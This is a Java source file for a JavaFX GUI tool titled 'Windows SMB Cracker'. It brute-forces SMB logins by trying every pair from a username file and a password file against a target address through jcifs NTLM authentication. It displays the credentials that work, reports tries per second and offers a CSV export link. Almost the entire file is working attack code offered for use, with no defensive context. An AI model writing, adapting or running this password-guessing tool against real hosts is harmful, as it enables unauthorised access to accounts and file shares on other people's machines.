package mattw.cracker.smb;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import javafx.scene.text.Font;
import javafx.scene.text.FontWeight;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import jcifs.smb.NtlmPasswordAuthentication;
import jcifs.smb.SmbAuthException;
import jcifs.smb.SmbFile;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.InetAddress;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Cracker extends Application {

    private File usersFile = null;
    private long totalUsers = -1;
    private File passesFile = null;
    private long totalPasses = -1;
    private long totalAttempts = -1;
    private long attempt = 0;
    private boolean running = true;
    private boolean hasResults = false;

    public static void main(String[] args) {
        launch(args);
    }

    public void setNodesDisabled(boolean disable, Node... nodes) {
        for(Node node : nodes) { node.setDisable(disable); }
    }

    public void start(Stage stage) {
        Label lbl = new Label("Address");
        lbl.setFont(Font.font("Tahoma", FontWeight.BOLD, 13));
        lbl.setTextFill(Color.WHITE);

        TextField address = new TextField();
        address.setPromptText("192.168.1.112");
        address.setTooltip(new Tooltip("The address of the machine to crack."));
        HBox.setHgrow(address, Priority.ALWAYS);

        Label at = new Label("@");
        at.setMinWidth(15);
        at.setTextFill(Color.WHITE);

        TextField domain = new TextField();
        domain.setPromptText("domain (optional)");
        domain.setTooltip(new Tooltip("For when the device uses a network domain to sign in."));

        HBox hbox4 = new HBox(5);
        hbox4.setAlignment(Pos.CENTER_RIGHT);
        hbox4.getChildren().addAll(address, at, domain);

        Label lbl1 = new Label("Usernames");
        lbl1.setFont(Font.font("Tahoma", FontWeight.SEMI_BOLD, 13));
        lbl1.setTextFill(Color.WHITE);

        Button chooseU = new Button("...");
        chooseU.setTooltip(new Tooltip("Select and open the usernames file."));

        Label lblU = new Label("username-list.txt");
        lblU.setMaxWidth(200);
        lblU.setTextFill(Color.LIGHTGRAY);

        Label lblUC = new Label("");
        lblUC.setFont(Font.font("Tahoma", FontWeight.BOLD, 13));

        HBox hbox0 = new HBox(10);
        hbox0.setAlignment(Pos.CENTER_LEFT);
        hbox0.getChildren().addAll(chooseU,lblU, lblUC);

        chooseU.setOnAction(ae -> {
            FileChooser chooser = new FileChooser();
            File file = chooser.showOpenDialog(stage.getOwner());
            if(file != null) {
                usersFile = file;
                Platform.runLater(() -> {
                    lblU.setTextFill(Color.LIGHTGREEN);
                    lblU.setText(usersFile.getName());
                });
                try {
                    int count = 0;
                    BufferedReader br = new BufferedReader(new FileReader(usersFile));
                    while(br.readLine() != null) {
                        count++;
                    }
                    br.close();
                    totalUsers = count;
                    final int c = count;
                    Platform.runLater(() -> {
                        lblUC.setTextFill(Color.LIGHTGRAY);
                        lblUC.setText(c+" users");
                    });
                } catch (Exception e) {
                    Platform.runLater(() -> {
                        lblUC.setTextFill(Color.RED);
                        lblUC.setText(e.getMessage());
                    });
                }
            }
        });

        Label lbl2 = new Label("Passwords");
        lbl2.setFont(Font.font("Tahoma", FontWeight.SEMI_BOLD, 13));
        lbl2.setTextFill(Color.WHITE);

        Button chooseP = new Button("...");
        chooseP.setTooltip(new Tooltip("Select and open the passwords file."));

        Label lblP = new Label("password-list.txt");
        lblP.setMaxWidth(200);
        lblP.setTextFill(Color.LIGHTGRAY);

        Label lblPC = new Label("");
        lblPC.setFont(Font.font("Tahoma", FontWeight.BOLD, 13));

        chooseP.setOnAction(ae -> {
            FileChooser chooser = new FileChooser();
            File file = chooser.showOpenDialog(stage.getOwner());
            if(file != null) {
                passesFile = file;
                Platform.runLater(() -> {
                    lblP.setTextFill(Color.LIGHTGREEN);
                    lblP.setText(passesFile.getName());
                });
                try {
                    int count = 0;
                    BufferedReader br = new BufferedReader(new FileReader(passesFile));
                    while(br.readLine() != null) {
                        count++;
                    }
                    br.close();
                    totalPasses = count;
                    final int c = count;
                    Platform.runLater(() -> {
                        lblPC.setTextFill(Color.LIGHTGRAY);
                        lblPC.setText(c+" passes");
                    });
                } catch (Exception e) {
                    Platform.runLater(() -> {
                        lblPC.setTextFill(Color.RED);
                        lblPC.setText(e.getMessage());
                    });
                }
            }
        });

        HBox hbox1 = new HBox(10);
        hbox1.setAlignment(Pos.CENTER_LEFT);
        hbox1.getChildren().addAll(chooseP,lblP,lblPC);

        Label lbl3 = new Label("Threads");
        lbl3.setFont(Font.font("Tahoma", FontWeight.SEMI_BOLD, 13));
        lbl3.setTextFill(Color.WHITE);

        Label prog = new Label("waiting");
        prog.setFont(Font.font("Tahoma", FontWeight.SEMI_BOLD, 13));
        prog.setTextFill(Color.LIGHTGRAY);

        Button start = new Button("Start");
        start.setMinWidth(100);
        start.setStyle("-fx-base: ivory");

        HBox hbox2 = new HBox(20);
        hbox2.setAlignment(Pos.CENTER_RIGHT);
        hbox2.getChildren().addAll(prog, start);

        ColumnConstraints cc0 = new ColumnConstraints();
        cc0.setPrefWidth(100);
        ColumnConstraints cc1 = new ColumnConstraints();
        cc1.setHgrow(Priority.ALWAYS);

        GridPane grid = new GridPane();
        grid.getColumnConstraints().addAll(cc0,cc1);
        grid.setVgap(5);
        grid.setHgap(10);
        grid.setPadding(new Insets(8));
        grid.setAlignment(Pos.TOP_LEFT);
        grid.setStyle("-fx-background-color: #5588bb;");
        grid.addRow(0, lbl, hbox4);
        grid.addRow(1, lbl1, hbox0);
        grid.addRow(2, lbl2, hbox1);
        grid.addRow(3, new Label(), hbox2);

        Label msg = new Label("No logins found");
        msg.setFont(Font.font("Tahoma", FontWeight.SEMI_BOLD, 14));

        ListView<Node> results = new ListView<>();
        results.setDisable(true);
        results.setMaxHeight(Double.MAX_VALUE);
        results.setStyle("-fx-stroke: red; -fx-stroke-width: 5px; -fx-stroke-dash-array: 12 4 6 4;");
        results.getItems().add(msg);
        VBox.setVgrow(results, Priority.ALWAYS);

        Label tps = new Label("0 tps");
        tps.setTooltip(new Tooltip("Tries Per Second (TPS)"));
        tps.setFont(Font.font("Tahoma", FontWeight.BOLD, 13));
        tps.setTextFill(Color.GRAY);

        Label space = new Label("");
        space.setMaxWidth(Double.MAX_VALUE);
        HBox.setHgrow(space, Priority.ALWAYS);

        Hyperlink export = new Hyperlink("Save as CSV");
        export.setDisable(true);

        HBox hbox3 = new HBox(10);
        hbox3.setAlignment(Pos.CENTER_RIGHT);
        hbox3.setPadding(new Insets(5,10,5,10));
        hbox3.getChildren().addAll(tps,space,export);
        hbox3.setStyle("-fx-background-color: lightgray;");

        VBox vbox = new VBox();
        vbox.setFillWidth(true);
        vbox.getChildren().addAll(grid, results, hbox3);

        class Entry extends HBox {
            public Entry(String host, String domain, String user, String pass, String msg) {
                Label login = new Label(user+":"+pass);
                login.setMaxWidth(Double.MAX_VALUE);
                HBox.setHgrow(login,Priority.ALWAYS);
                Label result = new Label(msg);
                getChildren().addAll(login, result);
            }
        }

        start.setOnAction(ae -> {
            ExecutorService es = Executors.newFixedThreadPool(1);
            es.execute(() -> {
                String addr = address.getText();
                String dom = domain.getText();
                if(!addr.trim().equals("")) {
                    if(usersFile != null && passesFile != null) {
                        setNodesDisabled(true, start, chooseP, chooseU, address, domain);
                        Platform.runLater(() -> {
                            prog.setTextFill(Color.LIGHTGRAY);
                            prog.setText("starting");
                        });
                        ExecutorService es2 = Executors.newFixedThreadPool(2);
                        running = true;
                        es2.execute(() -> {
                            try {
                                InetAddress inet = InetAddress.getByName(addr);
                                totalAttempts = totalUsers * totalPasses;
                                System.out.println(totalAttempts);
                                attempt = 0;
                                int percent = 0;
                                BufferedReader br = new BufferedReader(new FileReader(usersFile));
                                String user;
                                while((user = br.readLine()) != null) {
                                    BufferedReader br2 = new BufferedReader(new FileReader(passesFile));
                                    String pass;
                                    while((pass = br2.readLine()) != null) {
                                        attempt++;
                                        final double p;
                                        if(percent !=  (p = attempt / (double) totalAttempts)) {
                                            Platform.runLater(() -> {
                                                prog.setTextFill(Color.ORANGE);
                                                prog.setText(String.format("%.2f", p)+"% complete");
                                            });
                                        }
                                        final String login = user+":"+pass;
                                        Platform.runLater(() -> {
                                            stage.setTitle("Windows SMB Cracker - "+login);
                                        });
                                        String result = attemptLogin(addr, dom, user, pass);
                                        if(!result.equals("fail")) {
                                            if(!hasResults) {
                                                Platform.runLater(() -> {
                                                    results.getItems().clear();
                                                    results.setDisable(false);
                                                    export.setDisable(false);
                                                });
                                                hasResults = true;
                                            }
                                            Entry e = new Entry(addr, dom, user, pass, result);
                                            Platform.runLater(() -> {
                                                results.getItems().add(e);
                                            });
                                        }
                                    }
                                    br2.close();
                                }
                                br.close();
                            } catch (Exception e) {
                                setNodesDisabled(false, start, chooseP, chooseU, address, domain);
                                Platform.runLater(() -> {
                                    prog.setTextFill(Color.FIREBRICK);
                                    prog.setText(e.getMessage());
                                });
                            }
                            running = false;
                        });
                        es2.execute(() -> {
                            long time = 0;
                            long lastAttempts = 0;
                            while(running) {
                                if(System.currentTimeMillis() - time >= 1000) {
                                    final long diff = Math.abs(attempt-lastAttempts);
                                    lastAttempts = attempt;
                                    Platform.runLater(() -> {
                                        tps.setText(diff+" tps");
                                        Color fill = Color.GRAY;
                                        if(diff > 1000) {
                                            fill = Color.MAGENTA;
                                        }else if(diff > 500) {
                                            fill = Color.FORESTGREEN;
                                        } else if(diff > 300) {
                                            fill = Color.YELLOWGREEN;
                                        } else if(diff > 200) {
                                            fill = Color.GOLDENROD;
                                        } else if(diff > 100) {
                                            fill = Color.ORANGE;
                                        }
                                        tps.setTextFill(fill);
                                    });
                                    time = System.currentTimeMillis();
                                }
                                try { Thread.sleep(20); } catch (Exception ignored) {}
                            }
                        });
                        try {
                            es2.shutdown();
                            es2.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
                        } catch (Exception e) {
                            Platform.runLater(() -> {
                                prog.setTextFill(Color.FIREBRICK);
                                prog.setText(e.getMessage());
                            });
                        }
                        setNodesDisabled(false, start, chooseP, chooseU, address, domain);
                        Platform.runLater(() -> {
                            prog.setTextFill(Color.LIGHTGREEN);
                            prog.setText("100% complete");
                        });
                    } else {
                        Platform.runLater(() -> {
                            prog.setTextFill(Color.FIREBRICK);
                            prog.setText("missing file");
                        });
                    }
                } else {
                    Platform.runLater(() -> {
                        prog.setTextFill(Color.FIREBRICK);
                        prog.setText("no address set");
                    });
                }
            });
            es.shutdown();
        });

        Scene scene = new Scene(vbox, 500, 400);
        stage.setTitle("Windows SMB Cracker");
        stage.setScene(scene);
        stage.getIcons().add(new Image("mattw/cracker/smb/img/icon2.png"));
        stage.setOnCloseRequest(we -> {
            Platform.exit();
            System.exit(0);
        });
        stage.show();
        chooseU.requestFocus();
    }

    public String attemptLogin(String host, String domain, String user, String pass) {
        final NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(domain, user, pass);
        try {
            final SmbFile[] domains = new SmbFile("smb://" + host + "/", auth).listFiles();
            for (int a = 0; a < domains.length; ++a) {
                final File f = new File(domains[a].getPath().replace("smb:", "").replace("/", "\\"));
                final int b = a;
                if(f.exists()) {
                    return "local";
                } else {
                    try {
                        domains[b].listFiles();
                        return "smb";
                    } catch (SmbAuthException e) {
                        return e.getMessage();
                    } catch (Throwable t) {}
                }
            }
            return "yes";
        } catch (Exception e) {}
        return "fail";
    }

}